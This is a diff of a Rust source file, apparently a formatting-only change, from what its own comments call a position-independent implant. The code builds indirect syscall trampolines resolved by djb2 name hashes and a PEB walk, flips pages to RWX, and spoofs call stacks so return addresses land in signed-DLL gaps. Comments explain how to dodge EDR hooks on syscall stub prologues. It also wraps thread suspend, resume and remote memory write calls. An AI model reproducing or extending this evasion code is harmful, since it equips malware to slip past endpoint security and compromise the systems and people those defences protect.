@@ -65,13 +65,13 @@ impl Runtime {
                 };
                 let t = nyx_evasion::resolve_table(&src);
                 fresh_guard.set(fresh_base); // RAII: unmap on drop
-                // CRITICAL: always use the IN-PROCESS ntdll for the gadget address.
-                // The fresh mapping will be unmapped by FreshMapGuard::drop, so any
-                // absolute address inside it becomes a dangling pointer — every
-                // subsequent indirect syscall would crash with an access violation.
-                // The in-process ntdll's code pages are permanently mapped; EDRs
-                // hook stub PROLOGUES (the first 5-14 bytes), not the `syscall; ret`
-                // tail (0F 05 C3), so the gadget scan always finds a clean one.
+                                             // CRITICAL: always use the IN-PROCESS ntdll for the gadget address.
+                                             // The fresh mapping will be unmapped by FreshMapGuard::drop, so any
+                                             // absolute address inside it becomes a dangling pointer — every
+                                             // subsequent indirect syscall would crash with an access violation.
+                                             // The in-process ntdll's code pages are permanently mapped; EDRs
+                                             // hook stub PROLOGUES (the first 5-14 bytes), not the `syscall; ret`
+                                             // tail (0F 05 C3), so the gadget scan always finds a clean one.
                 let inproc_gadget = scan_syscall_gadget(&ntdll)?;
                 (t, inproc_gadget)
             }
@@ -112,8 +112,12 @@ impl Runtime {
         // method flips it to RWX briefly for the stub write, then back to RX.
         // MEM_COMMIT|MEM_RESERVE (0x3000). Resolved via the PEB walk.
         let va = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
-        type VirtualAlloc =
-            unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, u32) -> *mut core::ffi::c_void;
+        type VirtualAlloc = unsafe extern "system" fn(
+            *mut core::ffi::c_void,
+            usize,
+            u32,
+            u32,
+        ) -> *mut core::ffi::c_void;
         let f: VirtualAlloc = core::mem::transmute(va);
         let page = f(
             core::ptr::null_mut(),
@@ -188,7 +192,9 @@ impl Runtime {
         // Best-effort restore to RX. If flip_to_rx fails, the page stays RWX —
         // not ideal for stealth but not a crash. The alternative (trapping) is
         // worse for a PIC implant.
-        unsafe { flip_to_rx(self.trampoline as usize, stub.len()); }
+        unsafe {
+            flip_to_rx(self.trampoline as usize, stub.len());
+        }
 
         self.trampoline as *const u8
     }
@@ -322,12 +328,14 @@ pub unsafe fn syscall4(
     // caller's return address resolves to a signed-DLL .pdata gap instead of
     // an implant address. Degrades to direct call when: no gap pool installed,
     // swap disabled, or CET active.
-    unsafe { crate::stack::spoof_wrap(|| {
-        let stub_addr = rt.trampoline_for(ssn);
-        type Stub = unsafe extern "system" fn(usize, usize, usize, usize) -> i32;
-        let f: Stub = core::mem::transmute(stub_addr);
-        Some(f(a1, a2, a3, a4))
-    }) }
+    unsafe {
+        crate::stack::spoof_wrap(|| {
+            let stub_addr = rt.trampoline_for(ssn);
+            type Stub = unsafe extern "system" fn(usize, usize, usize, usize) -> i32;
+            let f: Stub = core::mem::transmute(stub_addr);
+            Some(f(a1, a2, a3, a4))
+        })
+    }
 }
 
 /// 5-argument indirect syscall (e.g. `NtProtectVirtualMemory`). Same stub as
@@ -347,12 +355,14 @@ pub unsafe fn syscall5(
     a5: usize,
 ) -> Option<i32> {
     let ssn = rt.ssn_by_hash(name_hash)?;
-    unsafe { crate::stack::spoof_wrap(|| {
-        let stub_addr = rt.trampoline_for(ssn);
-        type Stub = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;
-        let f: Stub = core::mem::transmute(stub_addr);
-        Some(f(a1, a2, a3, a4, a5))
-    }) }
+    unsafe {
+        crate::stack::spoof_wrap(|| {
+            let stub_addr = rt.trampoline_for(ssn);
+            type Stub = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;
+            let f: Stub = core::mem::transmute(stub_addr);
+            Some(f(a1, a2, a3, a4, a5))
+        })
+    }
 }
 
 /// 6-argument indirect syscall. The indirect stub bytes are identical to the
@@ -375,12 +385,14 @@ pub unsafe fn syscall6(
     a6: usize,
 ) -> Option<i32> {
     let ssn = rt.ssn_by_hash(name_hash)?;
-    unsafe { crate::stack::spoof_wrap(|| {
-        let stub_addr = rt.trampoline_for(ssn);
-        type Stub = unsafe extern "system" fn(usize, usize, usize, usize, usize, usize) -> i32;
-        let f: Stub = core::mem::transmute(stub_addr);
-        Some(f(a1, a2, a3, a4, a5, a6))
-    }) }
+    unsafe {
+        crate::stack::spoof_wrap(|| {
+            let stub_addr = rt.trampoline_for(ssn);
+            type Stub = unsafe extern "system" fn(usize, usize, usize, usize, usize, usize) -> i32;
+            let f: Stub = core::mem::transmute(stub_addr);
+            Some(f(a1, a2, a3, a4, a5, a6))
+        })
+    }
 }
 
 /// 11-argument indirect syscall. Used for the wide-arity NT file/object APIs
@@ -408,15 +420,26 @@ pub unsafe fn syscall11(
     a11: usize,
 ) -> Option<i32> {
     let ssn = rt.ssn_by_hash(name_hash)?;
-    unsafe { crate::stack::spoof_wrap(|| {
-        let stub_addr = rt.trampoline_for(ssn);
-        type Stub = unsafe extern "system" fn(
-            usize, usize, usize, usize, usize, usize,
-            usize, usize, usize, usize, usize,
-        ) -> i32;
-        let f: Stub = core::mem::transmute(stub_addr);
-        Some(f(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11))
-    }) }
+    unsafe {
+        crate::stack::spoof_wrap(|| {
+            let stub_addr = rt.trampoline_for(ssn);
+            type Stub = unsafe extern "system" fn(
+                usize,
+                usize,
+                usize,
+                usize,
+                usize,
+                usize,
+                usize,
+                usize,
+                usize,
+                usize,
+                usize,
+            ) -> i32;
+            let f: Stub = core::mem::transmute(stub_addr);
+            Some(f(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11))
+        })
+    }
 }
 
 /// A typed wrapper around an indirect syscall. Resolves the SSN by name hash
@@ -435,12 +458,32 @@ macro_rules! syscall {
     ($rt:expr, $name:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr,
      $a5:expr, $a6:expr, $a7:expr, $a8:expr, $a9:expr, $a10:expr, $a11:expr) => {
         $crate::syscalls::syscall11(
-            $rt, $crate::resolve::djb2($name),
-            $a1, $a2, $a3, $a4, $a5, $a6, $a7, $a8, $a9, $a10, $a11,
+            $rt,
+            $crate::resolve::djb2($name),
+            $a1,
+            $a2,
+            $a3,
+            $a4,
+            $a5,
+            $a6,
+            $a7,
+            $a8,
+            $a9,
+            $a10,
+            $a11,
         )
     };
     ($rt:expr, $name:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr, $a5:expr, $a6:expr) => {
-        $crate::syscalls::syscall6($rt, $crate::resolve::djb2($name), $a1, $a2, $a3, $a4, $a5, $a6)
+        $crate::syscalls::syscall6(
+            $rt,
+            $crate::resolve::djb2($name),
+            $a1,
+            $a2,
+            $a3,
+            $a4,
+            $a5,
+            $a6,
+        )
     };
     ($rt:expr, $name:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr) => {
         $crate::syscalls::syscall4($rt, $crate::resolve::djb2($name), $a1, $a2, $a3, $a4)
@@ -537,7 +580,10 @@ pub unsafe extern "system" fn nyx_selftest_rt_steps() {
         // 0xB4: trampoline page (VirtualAlloc RX).
         if let Some(va) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") {
             type VirtualAlloc = unsafe extern "system" fn(
-                *mut core::ffi::c_void, usize, u32, u32,
+                *mut core::ffi::c_void,
+                usize,
+                u32,
+                u32,
             ) -> *mut core::ffi::c_void;
             let f: VirtualAlloc = unsafe { core::mem::transmute(va) };
             let page = unsafe { f(core::ptr::null_mut(), 0x1000, 0x3000, 0x20) };
@@ -705,12 +751,26 @@ pub unsafe fn nt_query_attributes_file(
     obj_attr: usize,
     file_info: usize,
 ) -> Option<i32> {
-    syscall4(rt, djb2(b"ntqueryattributesfile"), obj_attr, file_info, 0, 0)
+    syscall4(
+        rt,
+        djb2(b"ntqueryattributesfile"),
+        obj_attr,
+        file_info,
+        0,
+        0,
+    )
 }
 
 /// `NtDelayExecution` — 2 real args (padded into the 4-arg shim).
 pub unsafe fn nt_delay_execution(rt: &Runtime, alertable: u8, delay: usize) -> Option<i32> {
-    syscall4(rt, djb2(b"ntdelayexecution"), alertable as usize, delay, 0, 0)
+    syscall4(
+        rt,
+        djb2(b"ntdelayexecution"),
+        alertable as usize,
+        delay,
+        0,
+        0,
+    )
 }
 
 /// `NtWaitForSingleObject(Handle, Alertable, Timeout*)` — 3 real args, padded
@@ -882,11 +942,7 @@ pub unsafe fn nt_write_virtual_memory(
 /// # Safety
 /// `thread` must have THREAD_SUSPEND_RESUME access. `prev_count` may be null
 /// (the output is ignored via padding) or a valid `u32` pointer.
-pub unsafe fn nt_suspend_thread(
-    rt: &Runtime,
-    thread: usize,
-    prev_count: &mut u32,
-) -> Option<i32> {
+pub unsafe fn nt_suspend_thread(rt: &Runtime, thread: usize, prev_count: &mut u32) -> Option<i32> {
     syscall4(
         rt,
         djb2(b"ntsuspendthread"),
@@ -903,11 +959,7 @@ pub unsafe fn nt_suspend_thread(
 /// # Safety
 /// `thread` must have THREAD_SUSPEND_RESUME access. `prev_count` may be null
 /// (the output is ignored via padding) or a valid `u32` pointer.
-pub unsafe fn nt_resume_thread(
-    rt: &Runtime,
-    thread: usize,
-    prev_count: &mut u32,
-) -> Option<i32> {
+pub unsafe fn nt_resume_thread(rt: &Runtime, thread: usize, prev_count: &mut u32) -> Option<i32> {
     syscall4(
         rt,
         djb2(b"ntresumethread"),
